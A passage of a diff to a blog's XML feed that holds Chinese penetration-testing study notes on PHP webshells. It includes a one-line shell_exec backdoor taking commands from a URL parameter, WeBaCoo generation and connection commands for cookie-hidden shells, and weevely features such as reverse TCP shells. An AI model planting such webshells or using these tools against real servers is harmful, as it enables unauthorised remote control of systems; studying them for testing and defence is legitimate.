+        <content type="html"><![CDATA[<ul><li>&lt;?php echo shell_exec($_GET[‘cmd’]);?&gt;</li><li>中国菜刀：<a href="http://www.maicaidao.co" target="_blank" rel="noopener">http://www.maicaidao.co</a></li><li>可能被IDS、AV、WAF、扫描器软件发现查杀</li></ul><a id="more"></a><h4 id="webacoo"><a href="#webacoo" class="headerlink" title="webacoo"></a>webacoo</h4><ul><li>WeBaCoo（Web Backdoor Cookie）<ul><li>类终端的shell</li><li>编码通信内容通过cookie头传输，隐蔽性较强</li><li>cm：base64编码的命令</li><li>cn：服务器用于返回数据的cookie头的名</li><li>cp：返回信息定界符</li></ul></li><li>生成服务端<ul><li><code>webacoo -g -o a.php</code></li><li><code>webacoo-t -u http://1.1.1.1/a.php</code></li></ul></li></ul><h4 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h4><ul><li>隐蔽的类终端php webshell</li><li>30多个管理模块<ul><li>执行系统命令、浏览文件系统</li><li>检查服务器常见配置错误</li><li>创建正向、反向TCPshell连接</li><li>通过目标计算机代理http流量</li><li>从目标计算机运行端口扫描，渗透内网</li></ul></li><li>支持连接密码</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web渗透-SSL/TLS拒绝服务、Ajax、WebService</title>
       <link href="/2020/11/05/Web%E6%B8%97%E9%80%8F-SSL-TLS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E3%80%81Ajax%E3%80%81WebService/"/>
       <url>/2020/11/05/Web%E6%B8%97%E9%80%8F-SSL-TLS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E3%80%81Ajax%E3%80%81WebService/</url>
